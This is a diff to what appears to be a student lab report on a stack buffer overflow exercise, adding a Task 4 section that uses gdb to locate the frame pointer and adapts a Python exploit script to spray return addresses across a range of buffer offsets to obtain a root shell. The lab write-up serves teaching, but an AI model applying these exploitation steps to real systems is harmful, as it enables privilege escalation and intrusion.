@@ -32,7 +32,7 @@
 
 ## Task 3
 
->To exploit the vulnerability, we created an empty `badfile` and executed the vulnerable code in debug mode, so we could fiugre out the `bof()` function's return address compared to the start of the buffer.
+>To exploit the vulnerability, we created an empty `badfile` and executed the vulnerable code in debug mode, so we could figure out the `bof()` function's return address compared to the start of the buffer.
 >
 >To that end, we used `gbd` and used a breakpoint in the `bof()` function.
 >```
@@ -79,6 +79,52 @@
 >offset = 0xffffcb18 - 0xffffcaac + 4 
 >```
 >
+>Executing this program generated a `badfile` file.
+>
+>Finally, we executed the program that creates the buffer overflow and boots a shell with root permissions.
+
+## Task 4
+
+>To exploit the vulnerability, we created an empty `badfile` and executed the vulnerable code in debug mode, so we could figure out the `bof()` function's return address compared to the start of the buffer.
+>
+>To that end, we used `gbd` and used a breakpoint in the `bof()` function.
+>```
+>$ touch badfile
+>$ gdb stack-L2-dbg
+>gdb-peda$ b bof 
+>Breakpoint 1 at 0x12ad: file stack.c, line 16.
+>gdb-peda$ run 
+>...
+>Breakpoint 1, bof(...)
+>...
+>gdb-peda$ next
+>...
+>gdb-peda$ p $ebp 
+>$1 = (void *) 0xffffcb18
+>gdb-peda$ quit
+>```
+>
+>In the given python program, we made the following changes:
+>
+>The `shellcode` and the `start` variables were not changed from Task 3.
+>
+>Because the buffer size range is 100 to 200, we added 200 instead of the `start` variable so we "spray" the first 200 bytes of the buffer with Return Addresses to make sure we hit the right one. This technique is known as *spraying*.
+>
+>```
+>ret = 0xffffcb18 + 200
+>```
+>
+>We used the same calculation from Task 3 for the `offset` variable.
+>```
+>offset = 112 
+>```
+>
+>Instead of putting the return address in the [112:116] memory slot, we put the return address in every memory slot from 112 to 212, because of the 100 to 200 buffer size range.
+>
+>```
+>for i in range(offset, offset + 100, 4)
+>   content[i:i+L] = (ret).to_bytes(L,byteorder='little')
+>```
 >Executing this program generated a `badfile` file.
 >
 >Finally, we executed the program that creates the buffer overflow and boots a shell with root permissions.
